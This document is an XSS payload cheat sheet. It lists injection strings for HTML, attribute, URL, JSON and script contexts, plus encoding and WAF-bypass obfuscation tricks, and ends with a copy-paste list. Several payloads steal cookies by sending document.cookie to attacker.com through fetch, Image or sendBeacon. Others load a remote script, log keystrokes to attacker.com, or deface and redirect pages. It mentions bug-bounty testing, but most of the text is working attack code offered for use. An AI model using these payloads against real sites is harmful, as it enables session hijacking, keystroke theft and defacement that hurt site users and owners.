# XSS PAYLOADS COMPLETE CHEAT SHEET

## 1. BASIC HTML/SCRIPT CONTEXT PAYLOADS (no encoding)
These are injected directly into HTML or script contexts. They work if the injection point is within HTML tags or script blocks.

```
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<details ontoggle=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<iframe src="javascript:alert(1)">
<object data="javascript:alert(1)">
<a href="javascript:alert(1)">Click</a>
<script>alert(1)</script>
<script>print()</script>
<script>confirm(1)</script>
<script>prompt(1)</script>
<script>console.log(1)</script>
<script>document.write('XSS')</script>
```

---

## 2. ATTRIBUTE CONTEXT PAYLOADS (closing quotes)
When injection occurs inside an HTML attribute value (e.g., `value="INJECT"` or `onclick="INJECT"`), you need to break out of the attribute.

```
" onmouseover="alert(1)"
" onclick="alert(1)"
" autofocus onfocus="alert(1)"
" onerror="alert(1)"
" onload="alert(1)"
" onmouseout="alert(1)"
" onkeydown="alert(1)"
" onkeyup="alert(1)"
" onchange="alert(1)"
" oninput="alert(1)"
" oninvalid="alert(1)"
" onreset="alert(1)"
" onselect="alert(1)"
" onsubmit="alert(1)"
```

---

## 3. URL CONTEXT PAYLOADS (javascript:)
If injected into a URL (like `href` or `src`), use the javascript: protocol.

```
javascript:alert(1)
javascript:alert(document.cookie)
javascript:location='//attacker.com/?'+document.cookie
javascript:fetch('//attacker.com/?'+document.cookie)
javascript:new Image().src='//attacker.com/?'+document.cookie
```

---

## 4. JSON CONTEXT PAYLOADS (for API responses / stored XSS)
When the injection is in a JSON value that is later rendered as HTML, you must escape double quotes and backslashes. These are commonly used in POST bodies (like `/api/checkout`).

**Payload structure (JSON string value)**:
`{"field": "<img src=\"x\" onerror=\"alert(1)\">"}`

**Example JSON payloads:**

```
"<img src=\"x\" onerror=\"alert(1)\">"
"<img src=\"x\" onerror=\"alert('HACKED')\">"
"<img src=\"x\" onerror=\"document.body.innerHTML='<h1>HACKED</h1>'\">"
"<img src=\"x\" onerror=\"document.body.innerHTML='<h1 style=color:red;font-size:80px;text-align:center;margin-top:40vh;>HACKED</h1>'\">"
"<svg onload=\"alert(1)\">"
"<body onload=\"alert(1)\">"
"<script>alert(1)</script>"  <!-- but careful with escaping -->
"<img src=x onerror=\"fetch('//attacker.com/?'+document.cookie)\">"
"<img src=x onerror=\"new Image().src='//attacker.com/?'+document.cookie\">"
"<img src=x onerror=\"document.location='//attacker.com/?'+document.cookie\">"
"<img src=x onerror=\"navigator.sendBeacon('//attacker.com',document.cookie)\">"
"<img src=x onerror=\"console.log('XSS')\">"   <!-- silent, for VDP -->
```

**For the `onerror` using function calls with parentheses** (escaped):

```
"<img src=x onerror=\"alert(1)\">"
"<img src=x onerror=\"alert('XSS')\">"
"<img src=x onerror=\"document.write('XSS')\">"
```

**For defacement (complete page replace)**:

```
"<img src=x onerror=\"document.body.innerHTML='<h1>HACKED</h1>'\">"
"<img src=x onerror=\"document.write('<h1>HACKED</h1>')\">"
```

**For stealing cookies** (if you control a server):

```
"<img src=x onerror=\"fetch('https://attacker.com/log?c='+document.cookie)\">"
"<img src=x onerror=\"new Image().src='https://attacker.com/log?c='+document.cookie\">"
```

**For redirect**:

```
"<img src=x onerror=\"window.location='https://attacker.com'\">"
"<img src=x onerror=\"top.location='https://attacker.com'\">"
```

**For loading external script**:

```
"<img src=x onerror=\"document.write('<script src=\\'https://attacker.com/m.js\\'><\\/script>')\">"
```

**For keylogging**:

```
"<img src=x onerror=\"document.addEventListener('keydown',e=>fetch('https://attacker.com/k?k='+e.key))\">"
```

---

## 5. ENCODED PAYLOADS (URL, HTML entities, Unicode, Hex, etc.)
Useful when filters are in place.

### URL Encoding (common)
```
%3Cscript%3Ealert(1)%3C/script%3E
%3Cimg%20src=x%20onerror=alert(1)%3E
%3Csvg%20onload=alert(1)%3E
%3Cbody%20onload=alert(1)%3E
%3Cdetails%20ontoggle=alert(1)%3E
```

### HTML Entities (Decimal)
```
&#60;script&#62;alert(1)&#60;/script&#62;
&#60;img src=x onerror=alert(1)&#62;
&#60;svg onload=alert(1)&#62;
&#60;body onload=alert(1)&#62;
```

### HTML Entities (Hex)
```
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
&#x3C;img src=x onerror=alert(1)&#x3E;
&#x3C;svg onload=alert(1)&#x3E;
```

### Double Encoding
```
%25253Cscript%25253Ealert(1)%25253C%25252Fscript%25253E
%25253Cimg%252520src=x%252520onerror=alert(1)%25253E
```

### Hex Encoding (complete payload)
```
%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E
%3C%69%6D%67%20%73%72%63%3D%78%20%6F%6E%65%72%72%6F%72%3D%61%6C%65%72%74%28%31%29%3E
```

### Unicode Encoding (JavaScript string)
```
\u003Cscript\u003Ealert(1)\u003C/script\u003E
\u003Cimg src=x onerror=alert(1)\u003E
```

### Null Byte Bypass (for some filters)
```
%3Cscr%00ipt%3Ealert(1)%3C/scr%00ipt%3E
%3Cimg%00src=x%00onerror=alert(1)%3E
%3Csvg%00onload=alert(1)%3E
```

---

## 6. WAF BYPASS / OBFUSCATION TECHNIQUES

### String concatenation
```
<script>window['ale'+'rt'](1)</script>
<img src=x onerror="top['al'+'ert'](1)">
<svg onload="self['ale'+'rt'](1)">
```

### Using `eval` with Base64
```
<script>eval(atob('YWxlcnQoMSk='))</script>
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
<svg onload="eval(atob('YWxlcnQoMSk='))">
```

### Using `Function` constructor
```
<script>Function('ale'+'rt(1)')()</script>
<img src=x onerror="Function('ale'+'rt(1)')()">
<svg onload="Function('alert(1)')()">
```

### Using `setTimeout` / `setInterval`
```
<script>setTimeout('ale'+'rt(1)',0)</script>
<img src=x onerror="setTimeout('ale'+'rt(1)',0)">
<svg onload="setInterval('ale'+'rt(1)',100)">
```

### Using `[].slice.constructor` etc.
```
<script>''.constructor.constructor('alert(1)')()</script>
<img src=x onerror="[].slice.constructor('alert(1)')()">
<svg onload="Object.constructor('alert(1)')()">
```

### Unicode escape in JavaScript (inside strings)
```
<script>window['\u0061\u006c\u0065\u0072\u0074'](1)</script>
<img src=x onerror="window['\x61\x6c\x65\x72\x74'](1)">
```

### Mixed encoding (HTML entity + URL)
```
<scr&#x69;pt>alert(1)</scr&#x69;pt>
<im&#x67; src=x onerror=alert(1)>
<svg onload=&#x61;lert(1)>
```

### Using `javascript:` pseudo-protocol with encoding
```
<a href="jav&#x61;script:alert(1)">Click</a>
<a href="jav%61script:alert(1)">Click</a>
<a href="%6A%61%76%61%73%63%72%69%70%74%3A%61%6C%65%72%74%28%31%29">Click</a>
```

---

## 7. DOM MANIPULATION PAYLOADS

### Change content
```
<script>document.body.innerHTML='<h1>HACKED</h1>'</script>
<img src=x onerror="document.title='XSS'">
<svg onload="document.background='red'">
<img src=x onerror="document.write('<h1>HACKED</h1>')">
```

### Redirect
```
<script>window.location='//attacker.com'</script>
<img src=x onerror="location='//attacker.com'">
<svg onload="top.location='//attacker.com'">
```

### Exfiltrate cookies (silent)
```
<script>fetch('//attacker.com/?'+document.cookie)</script>
<img src=x onerror="new Image().src='//attacker.com/?'+document.cookie">
<svg onload="navigator.sendBeacon('//attacker.com',document.cookie)">
```

### Persistent storage manipulation
```
<script>localStorage.setItem('xss','hacked')</script>
<img src=x onerror="sessionStorage.setItem('cookie',document.cookie)">
```

### Keylogger
```
<script>document.addEventListener('keydown',e=>fetch('//attacker.com/k?'+e.key))</script>
<img src=x onerror="document.onkeydown=function(e){fetch('//attacker.com/k?'+e.key)}">
```

---

## 8. SILENT / DEBUG PAYLOADS (for bug bounty / VDP)
These don’t cause popups but show in console or modify something subtle.

```
<script>console.log('XSS')</script>
<img src=x onerror="console.warn('XSS found')">
<svg onload="console.error('XSS')">
<body onload="document.cookie='test=1;path=/'">
<script>console.trace('XSS')</script>
```

---

## 9. POLYGLOT PAYLOAD (works in multiple contexts)
```
javascript:alert(1)//--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(42);//'>
```

---

## 10. CONTEXT-SPECIFIC CLOSING PAYLOADS

### If injection is inside a quoted attribute, close with `">` or `'>`
```
"> <svg onload=alert(1)>
'> <img src=x onerror=alert(1)>
"> <script>alert(1)</script>
'> <body onload=alert(1)>
```

### If injection is inside a script block (string context), break out with `';alert(1)//`
```
';alert(1)//
';alert(1)//'
';alert(1);//
';alert(1);//
";alert(1);//
";alert(1)//"
```

### If injection is inside a style block, close with `</style>`
```
</style><script>alert(1)</script>
```

### If injection is inside a title or textarea, close with `</title>` or `</textarea>`
```
</title><script>alert(1)</script>
</textarea><script>alert(1)</script>
```

---

## 11. JSON CONTEXT WITH DOUBLE ENCODING (for nested JSON)

Sometimes the API expects JSON, and the value is later embedded in another JSON response. You may need to escape backslashes as well.

```
"{\"img\":\"<img src=x onerror=alert(1)>\"}"
"{\"payload\":\"<img src=\\\"x\\\" onerror=\\\"alert(1)\\\">\"}"
```


---

## QUICK REFERENCE – ENCODING MAP

| Character | URL | HTML Decimal | HTML Hex | Unicode |
|-----------|-----|--------------|----------|---------|
| <         | %3C | &#60;        | &#x3C;   | \u003C  |
| >         | %3E | &#62;        | &#x3E;   | \u003E  |
| "         | %22 | &#34;        | &#x22;   | \u0022  |
| '         | %27 | &#39;        | &#x27;   | \u0027  |
| /         | %2F | &#47;        | &#x2F;   | \u002F  |
| (         | %28 | &#40;        | &#x28;   | \u0028  |
| )         | %29 | &#41;        | &#x29;   | \u0029  |
| space     | %20 | &#32;        | &#x20;   | \u0020  |

---

## TIPS FOR TESTING XSS

1. Always start with `<img src=x onerror=alert(1)>` or `"> <svg onload=alert(1)>`.
2. If blocked, try different event handlers (`onmouseover`, `onfocus`, `ontoggle`, etc.).
3. If popups are blocked, use `console.log('XSS')` to verify silently.
4. For JSON context, remember to escape backslashes and quotes.
5. If the injection point is in a URL parameter, use URL encoding and test with `javascript:alert(1)`.
6. For stored XSS, check if the payload persists and triggers when the page loads.
7. Use tools like Burp Suite or browser dev tools to see how your payload is reflected.
8. If filters strip `<script>`, try `<img src=x onerror=...>` or `<svg onload=...>`.
9. If double quotes are escaped, try single quotes or use hexadecimal entities.
10. If the application uses a WAF, try obfuscation techniques (null bytes, double encoding, mixed case, etc.).

# ALL IN ONE JUST FOR COPY PASTE AND USE IN A TXT FILE
```
<script>alert(1)</script>
<script>alert('XSS')</script>
<script>confirm(1)</script>
<script>prompt(1)</script>
<script>print()</script>
<script>console.log('XSS')</script>
<script>document.write('XSS')</script>
<img src=x onerror=alert(1)>
<img src=x onerror=alert('XSS')>
<svg onload=alert(1)>
<svg onload=alert('XSS')>
<body onload=alert(1)>
<details ontoggle=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<iframe src="javascript:alert(1)">
<object data="javascript:alert(1)">
<a href="javascript:alert(1)">Click</a>
" onmouseover="alert(1)"
" onclick="alert(1)"
" autofocus onfocus="alert(1)"
" onerror="alert(1)"
" onload="alert(1)"
" onmouseout="alert(1)"
" onkeydown="alert(1)"
" onkeyup="alert(1)"
" onchange="alert(1)"
" oninput="alert(1)"
" oninvalid="alert(1)"
" onreset="alert(1)"
" onselect="alert(1)"
" onsubmit="alert(1)"
' onmouseover='alert(1)'
' onclick='alert(1)'
' autofocus onfocus='alert(1)'
' onerror='alert(1)'
' onload='alert(1)'
' onmouseout='alert(1)'
' onkeydown='alert(1)'
' onkeyup='alert(1)'
' onchange='alert(1)'
' oninput='alert(1)'
' oninvalid='alert(1)'
' onreset='alert(1)'
' onselect='alert(1)'
' onsubmit='alert(1)'
javascript:alert(1)
javascript:confirm(1)
javascript:prompt(1)
javascript:console.log('XSS')
javascript:print()
"><script>alert(1)</script>
'><script>alert(1)</script>
"><img src=x onerror=alert(1)>
'><img src=x onerror=alert(1)>
"><svg onload=alert(1)>
'><svg onload=alert(1)>
</title><script>alert(1)</script>
</textarea><script>alert(1)</script>
</style><script>alert(1)</script>
';alert(1)//
";alert(1)//
';alert(1);//
";alert(1);//
%3Cscript%3Ealert(1)%3C/script%3E
%3Cimg%20src=x%20onerror=alert(1)%3E
%3Csvg%20onload=alert(1)%3E
%3Cbody%20onload=alert(1)%3E
%3Cdetails%20ontoggle=alert(1)%3E
&#60;script&#62;alert(1)&#60;/script&#62;
&#60;img src=x onerror=alert(1)&#62;
&#60;svg onload=alert(1)&#62;
&#60;body onload=alert(1)&#62;
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
&#x3C;img src=x onerror=alert(1)&#x3E;
&#x3C;svg onload=alert(1)&#x3E;
%25253Cscript%25253Ealert(1)%25253C%25252Fscript%25253E
%25253Cimg%252520src=x%252520onerror=alert(1)%25253E
%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E
%3C%69%6D%67%20%73%72%63%3D%78%20%6F%6E%65%72%72%6F%72%3D%61%6C%65%72%74%28%31%29%3E
\u003Cscript\u003Ealert(1)\u003C/script\u003E
\u003Cimg src=x onerror=alert(1)\u003E
%3Cscr%00ipt%3Ealert(1)%3C/scr%00ipt%3E
%3Cimg%00src=x%00onerror=alert(1)%3E
%3Csvg%00onload=alert(1)%3E
<script>window['ale'+'rt'](1)</script>
<img src=x onerror="top['al'+'ert'](1)">
<svg onload="self['ale'+'rt'](1)">
<script>eval(atob('YWxlcnQoMSk='))</script>
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
<svg onload="eval(atob('YWxlcnQoMSk='))">
<script>Function('ale'+'rt(1)')()</script>
<img src=x onerror="Function('ale'+'rt(1)')()">
<svg onload="Function('alert(1)')()">
<script>setTimeout('ale'+'rt(1)',0)</script>
<img src=x onerror="setTimeout('ale'+'rt(1)',0)">
<svg onload="setInterval('ale'+'rt(1)',100)">
<script>''.constructor.constructor('alert(1)')()</script>
<img src=x onerror="[].slice.constructor('alert(1)')()">
<svg onload="Object.constructor('alert(1)')()">
<script>window['\u0061\u006c\u0065\u0072\u0074'](1)</script>
<img src=x onerror="window['\x61\x6c\x65\x72\x74'](1)">
<scr&#x69;pt>alert(1)</scr&#x69;pt>
<im&#x67; src=x onerror=alert(1)>
<svg onload=&#x61;lert(1)>
<a href="jav&#x61;script:alert(1)">Click</a>
<a href="jav%61script:alert(1)">Click</a>
<a href="%6A%61%76%61%73%63%72%69%70%74%3A%61%6C%65%72%74%28%31%29">Click</a>
<script>document.body.innerHTML='<h1>XSS</h1>'</script>
<img src=x onerror="document.title='XSS'">
<svg onload="document.background='red'">
<img src=x onerror="document.write('<h1>XSS</h1>')">
<script>window.location='#XSS'</script>
<img src=x onerror="location='#XSS'">
<svg onload="top.location='#XSS'">
<script>console.log('XSS')</script>
<img src=x onerror="console.warn('XSS found')">
<svg onload="console.error('XSS')">
<script>console.trace('XSS')</script>
javascript:alert(1)//--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(42);//'>
"<img src=\"x\" onerror=\"alert(1)\">"
"<img src=\"x\" onerror=\"alert('XSS')\">"
"<svg onload=\"alert(1)\">"
"<body onload=\"alert(1)\">"
"<script>alert(1)</script>"
```
